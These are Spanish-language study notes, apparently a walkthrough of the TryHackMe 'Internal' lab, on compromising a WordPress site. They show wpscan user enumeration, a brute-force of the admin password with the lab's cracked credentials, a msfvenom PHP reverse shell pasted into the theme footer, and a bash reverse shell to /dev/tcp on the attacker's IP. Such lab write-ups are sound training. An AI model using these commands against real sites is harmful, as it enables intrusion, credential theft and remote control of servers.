# Hacking en Entornos WordPress – Parte 2

Maquinas a utilizar **Kali Linux y Internal** [https://tryhackme.com/room/internal](https://tryhackme.com/room/internal)

<aside>
💡

**Continuación de Hacking en Entornos WordPress – Parte 1**

</aside>

- Utilizamos wpscan para hacer enumeración de usuarios y de Plugins. Importante al poner la ruta **no debemos poner** la parte de **wp-login.php.**
    
    ```bash
    wpscan --url [http://10.10.32.70/blog](./imagenes/http://10.10.32.70/blog) --enumerate u,vp
    ```
    
    ![image.png](./imagenes/image%2013.png)
    
    <aside>
    
    `-url http://10.10.32.70/blog` → Indica la URL del sitio web objetivo.
    
    `-enumerate u,vp` → Solicita enumerar:
    
    `u` (Usuarios): Obtendrá la lista de usuarios registrados en WordPress, lo que puede ayudar en pruebas de seguridad como ataques de fuerza bruta en credenciales.
    
    `vp` (Plugins vulnerables): Identificará los plugins instalados que tengan vulnerabilidades conocidas.
    
    </aside>
    
    No nos a encontró ningún Plugin vulnerable pero si un `usuario llamado **admin`.**
    

<aside>
💡

Nos falta la contraseña. en el caso de WordPress debemos utilizar para ello WPScan ya que es una herramienta creada específicamente para WordPress.

</aside>

- Hacemos un ataque de fuerza bruta para encontrar la contraseña.
    
    ```bash
    wpscan --url [http://10.10.11.251/blog](./imagenes/http://10.10.11.251/blog) --passwords /usr/share/wordlists/rockyou.txt --usernames admin
    ```
    
    ![image.png](./imagenes/image%2014.png)
    
    <aside>
    
    `-url http://10.10.11.251/blog` → Especifica la URL del sitio de WordPress a analizar.
    
    `-passwords /usr/share/wordlists/rockyou.txt` → Utiliza el archivo `rockyou.txt`, un popular diccionario de contraseñas, para intentar encontrar la contraseña correcta mediante fuerza bruta.
    
    `-usernames admin` → Establece "admin" como el usuario objetivo para el intento de acceso.
    
    </aside>
    
    Ya tenemos la contraseña que coincide con el usuario **admin**.
    
    - Usuario: admin
    - Contraseña: my2boys
    
    ![image.png](./imagenes/image%2015.png)
    
    ![image.png](./imagenes/image%2016.png)
    
    ![image.png](./imagenes/image%2017.png)
    

- Una vez aquí nuestro **objetivo** debe ser como **inyectar un código malicioso en WordPress**. Es decir como editar una platilla (pagina web) para añadir un código malicioso para poder adquirir ejecución remota de comandos en WordPress .
    - Nos movemos a la sección **Appearance → Theme Editor**
        
        ![image.png](./imagenes/image%2018.png)
        
        ![image.png](./imagenes/image%2019.png)
        
    
    - Hacemos un clip en Theme Footer
        
        ![image.png](./imagenes/image%2020.png)
        
        ![image.png](./imagenes/image%2021.png)
        
    - En caso de que haya código como es en mi caso lo eliminamos todo.
        
        ![image.png](./imagenes/image%2022.png)
        

- En un terminal creamos un con msfvenom.
    
    ```bash
    msfvenom -p php/reverse_php LHOST=10.21.166.149 LPORT=443 -f raw > wp.php 
    ```
    
    ![image.png](./imagenes/image%2023.png)
    
    Señalo nuestra IP que he obtenido con `ifconfig`
    
- Hacemos un cat de wp.php y copiamos su contenido.
    
    ```bash
    cat wp.php 
    ```
    
    ![image.png](./imagenes/image%2024.png)
    
- Pegamos el contenido del archivo malicioso en **Edit Theme** y pulsamos en el botón **Update File.**
    
    ![image.png](./imagenes/image%2025.png)
    

- En un terminal nos ponemos con netcat a escuchar el puerto 443
    
    ![image.png](./imagenes/image%2026.png)
    

- Refrescamos la pagina principal del WordPress **http://10.10.11.251/blog/** . (Recordemos que que el **Footer** que hemos modificado es básicamente la pagina principal de WordPress). Y ya tenemos acceso remoto a la maquina victima .
    
    ![image.png](./imagenes/image%2027.png)
    

- Establecemos una nueva conexión ya que como sabemos las conexiones creadas con msfvenom duran poco tiempo.

- En **https://www.revshells.com/**
    
    ![image.png](./imagenes/image%2028.png)
    
    `bash -c "sh -i >& /dev/tcp/10.21.166.149/444 0>&1"`
    
    <aside>
    👉
    
    **OJO,** cuidado con el tipo de comillas que se utilizan deben ser las rectas.
    
    </aside>
    
- Ponemos otro netcat a la escucha en el puerto 444
    
    ![image.png](./imagenes/image%2029.png)
    

- Pegamos el código en la conexión 443 y ya tendremos una conexión estable en el puerto 444.
    
    ![image.png](./imagenes/image%2030.png)
    
    ![image.png](./imagenes/image%2031.png)
    

<aside>
👉

En caso de que en WordPress exita la opcion de “File Upload” , solo deberíamos subir el archivo malicioso que hemos creado y después llamarlo desde la URL

</aside>